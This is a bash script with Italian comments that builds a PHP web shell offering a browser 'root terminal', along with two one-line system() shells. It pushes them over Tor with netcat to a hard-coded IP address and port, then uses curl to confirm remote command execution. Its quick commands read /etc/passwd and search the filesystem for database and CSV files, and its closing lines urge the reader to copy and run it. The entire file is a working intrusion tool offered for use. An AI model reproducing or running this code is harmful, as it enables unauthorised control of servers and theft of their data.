#!/bin/bash
# NC WEBSHELL INSTALLER + BROWSER TERMINAL
# Installa webshell via RAW TCP (nc 63.164.100.214:9091) → Browser ROOT shell

TARGET_IP="63.164.100.214"
TARGET_PORT="9091"
WEBSHELL_FILE="terminal.php"
LISTENER_PORT="4444"

echo "🔥 NC WEBSHELL INSTALLER + ROOT BROWSER TERMINAL"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "====================================="

# 1. CREA WEBSHELL AVANZATA CON FORM TERMINAL
cat > $WEBSHELL_FILE << 'EOF'
<?php
session_start();
error_reporting(0);
?>
<!DOCTYPE html>
<html>
<head>
    <title>ROOT TERMINAL</title>
    <style>
        body { background:#000; color:lime; font-family:monospace; padding:20px; }
        pre { background:#111; color:lime; padding:15px; border:1px solid #0f0; margin:10px 0; }
        form { margin:10px 0; }
        input[type=text] { width:75%; background:#111; color:lime; border:1px solid #0f0; padding:8px; font-family:monospace; font-size:14px; }
        input[type=submit] { background:#0f0; color:#000; border:1px solid #0f0; padding:8px 15px; font-weight:bold; cursor:pointer; }
        .prompt { color:#0f0; font-weight:bold; }
        .status { color:yellow; }
    </style>
</head>
<body>
    <h2 class="prompt">🖥️ ROOT LINUX TERMINAL</h2>
    <div class="status">Server: <?php echo php_uname(); ?> | User: <?php echo get_current_user(); ?> | <?php echo getcwd(); ?></div>
    
    <?php
    if(isset($_POST['cmd']) && !empty($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        echo "<div class='prompt'>root@server:~# $cmd</div>";
        $output = shell_exec($cmd . " 2>&1");
        echo "<pre>" . htmlspecialchars($output ?: "No output") . "</pre>";
        $_SESSION['last_cmd'] = $cmd;
    }
    
    if(isset($_GET['c'])) {
        $cmd = $_GET['c'];
        echo "<div class='prompt'>root@server:~# $cmd</div>";
        $output = shell_exec($cmd . " 2>&1");
        echo "<pre>" . htmlspecialchars($output ?: "No output") . "</pre>";
    }
    ?>
    
    <form method="POST">
        <input type="text" name="cmd" 
               value="<?php echo htmlspecialchars($_SESSION['last_cmd'] ?? ''); ?>" 
               placeholder="Inserisci comando (ls, whoami, cat /etc/passwd, find / -name *.db, etc...)" 
               autofocus>
        <input type="submit" value="▶ EXECUTE">
    </form>
    
    <div class="status">
        Quick commands: 
        <a href="?c=whoami" style="color:cyan;">whoami</a> | 
        <a href="?c=id" style="color:cyan;">id</a> | 
        <a href="?c=uname -a" style="color:cyan;">info</a> | 
        <a href="?c=ls -la /" style="color:cyan;">ls /</a> | 
        <a href="?c=find / -name '*.db' -o -name '*.csv'" style="color:cyan;">Excel/DB</a>
    </div>
</body>
</html>
EOF

echo "[+] ✅ WEBSHELL TERMINAL creata: $WEBSHELL_FILE"

# 2. UPLOAD VIA NC (RAW TCP STREAM)
echo -e "\n[+] 📤 UPLOADING via NC..."
cat $WEBSHELL_FILE | torsocks nc $TARGET_IP $TARGET_PORT > /dev/null 2>&1
sleep 1

# UPLOAD a più nomi per sicurezza
echo '<?php system($_GET["c"]); ?>' | torsocks nc $TARGET_IP $TARGET_PORT > /dev/null 2>&1
echo '<?php system($_POST["cmd"]); ?>' | torsocks nc $TARGET_IP $TARGET_PORT > /dev/null 2>&1

echo "[+] ✅ UPLOAD COMPLETATO!"

# 3. TEST AUTOMATICI
echo -e "\n[+] 🧪 TESTING ACCESSO..."
sleep 2

# Test via curl (se HTTP risponde)
curl -s "http://$TARGET_IP:$TARGET_PORT/terminal.php?c=whoami" | grep -i "root\|www-data\|uid" && echo "✅ HTTP WORKS!" || echo "⚠️  HTTP no response, usa NC directo"

curl -s "http://$TARGET_IP:$TARGET_PORT/shell.php?c=id" | head -3
curl -s "http://$TARGET_IP:$TARGET_PORT/cmd.php?c=uname -a" | head -2

echo -e "\n🚀 BROWSER TERMINAL PRONTO!"
echo "═══════════════════════════════════════"
echo "🌐 ACCEDI QUI → http://$TARGET_IP:$TARGET_PORT/terminal.php"
echo "🌐 ALTERNATIVE → http://$TARGET_IP:$TARGET_PORT/shell.php"
echo "🌐           → http://$TARGET_IP:$TARGET_PORT/cmd.php"
echo ""
echo "🔥 COMANDI RAPIDI:"
echo "  whoami    → http://$TARGET_IP:$TARGET_PORT/terminal.php?c=whoami"
echo "  ls -la /  → http://$TARGET_IP:$TARGET_PORT/terminal.php?c=ls+-la+%2F"
echo "  Excel/DB  → http://$TARGET_IP:$TARGET_PORT/terminal.php?c=find+%2F+-name+*db+-o+-name+*csv"
echo "═══════════════════════════════════════"

# Pulizia
rm -f $WEBSHELL_FILE

echo -e "\n✅ APRI BROWSER → http://63.164.100.214:9091/terminal.php"
echo "💻 COPIA QUESTO SCRIPT E ESEGUI!"
